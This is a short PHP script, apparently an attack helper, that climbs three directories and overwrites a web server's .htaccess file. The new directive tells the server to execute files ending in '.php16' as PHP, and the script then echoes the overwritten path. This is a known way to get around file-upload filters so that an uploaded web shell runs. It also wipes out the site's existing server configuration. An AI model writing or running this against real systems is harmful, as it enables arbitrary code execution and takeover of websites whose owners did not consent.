<?php

$target = '../../../.htaccess';


file_put_contents($target, "AddType application/x-httpd-php .php16");
echo "File overwritten: ".realpath($target);